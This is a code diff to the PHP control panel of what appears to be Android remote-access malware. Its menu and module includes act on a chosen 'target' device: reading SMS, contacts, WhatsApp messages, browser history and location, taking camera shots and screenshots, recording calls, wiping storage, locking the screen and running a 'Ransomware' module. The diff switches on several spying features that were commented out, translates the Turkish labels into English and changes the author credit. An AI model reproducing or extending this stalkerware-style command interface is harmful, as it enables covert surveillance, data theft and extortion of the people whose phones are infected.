@@ -68,28 +68,28 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
             <div class="list-group">
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=1" class="list-group-item <?php if ($_GET['type']==1){ echo 'active';}?>">Specifications</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=2" class="list-group-item <?php if ($_GET['type']==2){ echo 'active';}?>">Location</a>
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=3" class="list-group-item <?php if ($_GET['type']==3){ echo 'active';}?>"">Guide</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=3" class="list-group-item <?php if ($_GET['type']==3){ echo 'active';}?>">Contacts</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=4" class="list-group-item <?php if ($_GET['type']==4){ echo 'active';}?>">GetSms</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=5" class="list-group-item <?php if ($_GET['type']==5){ echo 'active';}?>">Send SMS</a>
-               <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=6" class="list-group-item <?php if ($_GET['type']==6){ echo 'active';}?>">Listening to media</a> -->
-                <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=7" class="list-group-item <?php if ($_GET['type']==7){ echo 'active';}?>">Chat</a> -->
+               <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=6" class="list-group-item <?php if ($_GET['type']==6){ echo 'active';}?>">Listening to media</a>
+                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=7" class="list-group-item <?php if ($_GET['type']==7){ echo 'active';}?>">Chat</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=8" class="list-group-item <?php if ($_GET['type']==8){ echo 'active';}?>">Toast</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=81" class="list-group-item <?php if ($_GET['type']==81){ echo 'active';}?>">WipeSdcard</a>
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=82" class="list-group-item <?php if ($_GET['type']==82){ echo 'active';}?>">LockTheScreen</a>
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=83" class="list-group-item <?php if ($_GET['type']==83){ echo 'active';}?>">changewallpaper</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=82" class="list-group-item <?php if ($_GET['type']==82){ echo 'active';}?>">Lock The Screen</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=83" class="list-group-item <?php if ($_GET['type']==83){ echo 'active';}?>">Change Background</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=84" class="list-group-item <?php if ($_GET['type']==84){ echo 'active';}?>">Ransomware</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=85" class="list-group-item <?php if ($_GET['type']==85){ echo 'active';}?>">Vibrate</a>
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=86" class="list-group-item <?php if ($_GET['type']==86){ echo 'active';}?>">DeleteCallLogs</a>
-                <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=9" class="list-group-item <?php if ($_GET['type']==9){ echo 'active';}?>">Screenshot</a> -->
-                <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=10" class="list-group-item <?php if ($_GET['type']==10){ echo 'active';}?>">Camera</a> -->
-                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=11" class="list-group-item <?php if ($_GET['type']==11){ echo 'active';}?>">Scanner</a> -->
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=12" class="list-group-item <?php if ($_GET['type']==12){ echo 'active';}?>">Searches</a>
-                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=13" class="list-group-item <?php if ($_GET['type']==13){ echo 'active';}?>">Call Voice Recordings</a> -->
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=86" class="list-group-item <?php if ($_GET['type']==86){ echo 'active';}?>">Delete Call Logs</a>
+                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=9" class="list-group-item <?php if ($_GET['type']==9){ echo 'active';}?>">Screenshot</a>
+                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=10" class="list-group-item <?php if ($_GET['type']==10){ echo 'active';}?>">Camera</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=11" class="list-group-item <?php if ($_GET['type']==11){ echo 'active';}?>">Browser</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=12" class="list-group-item <?php if ($_GET['type']==12){ echo 'active';}?>">Calls</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=13" class="list-group-item <?php if ($_GET['type']==13){ echo 'active';}?>">Call Voice Recordings</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=14" class="list-group-item <?php if ($_GET['type']==14){ echo 'active';}?>">Application</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=15" class="list-group-item <?php if ($_GET['type']==15){ echo 'active';}?>">Folders</a>
-                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=16" class="list-group-item <?php if ($_GET['type']==16){ echo 'active';}?>">Whattsap Mesajları</a> -->
-                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=17" class="list-group-item <?php if ($_GET['type']==17){ echo 'active';}?>">Kullanıcıya Ses Dinlettir</a> -->
-                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=18" class="list-group-item <?php if ($_GET['type']==18){ echo 'active';}?>">Numara Ara</a> -->
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=16" class="list-group-item <?php if ($_GET['type']==16){ echo 'active';}?>">Whatsapp Messages</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=17" class="list-group-item <?php if ($_GET['type']==17){ echo 'active';}?>">Let The Music Play</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=18" class="list-group-item <?php if ($_GET['type']==18){ echo 'active';}?>">Call Number</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=19" class="list-group-item <?php if ($_GET['type']==19){ echo 'active';}?>">TTS</a>
 
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=20" class="list-group-item">Exit</a>
@@ -100,11 +100,11 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
 
             <?php
             if ($_GET['type']==1){
-                include './modules/device-property.php';
+                include './modules/device_property.php';
             } elseif ($_GET['type']==2){
                 include './modules/location-tracker.php';
             } elseif ($_GET['type']==3){
-                include './modules/rehber.php';
+                include './modules/contacts.php';
             } elseif ($_GET['type']==4){
                 include './modules/read_all_sms.php';
             } elseif ($_GET['type']==5){
@@ -114,23 +114,23 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
             } elseif ($_GET['type']==7){
 
             } elseif ($_GET['type']==8){
-                include './modules/screen-message.php';
+                include './modules/screen_message.php';
             } elseif ($_GET['type']==81){
                 include './modules/wipe.php';    
             } elseif ($_GET['type']==82){
-                include './modules/LockTheScreen.php'; 
+                include './modules/lock_the_screen.php'; 
             } elseif ($_GET['type']==83){
-                include './modules/changewallpaper.php'; 
+                include './modules/change_background.php'; 
             } elseif ($_GET['type']==84){
                 include './modules/ransomware.php'; 
             } elseif ($_GET['type']==85){
                 include './modules/vibrate.php'; 
             } elseif ($_GET['type']==86){
-                include './modules/deletecalls.php'; 
+                include './modules/delete_calls.php'; 
             } elseif ($_GET['type']==9){
 
             } elseif ($_GET['type']==10){
-                include './modules/screen-capture.php';
+                include './modules/screen_capture.php';
             } elseif ($_GET['type']==11){
                 include './modules/browser_history.php';
             } elseif ($_GET['type']==12){
@@ -168,7 +168,7 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
     </div>
     <div class="row tall-row">
         <div class="col-md-offset-8">
-            <p>Created by <a href="#">Mehmet Şirin Sulan</a>. &copy; 2021</p>
+            <p>Created by <a href="#">Niyazi</a>. &copy; 2022</p>
         </div>
     </div>
 
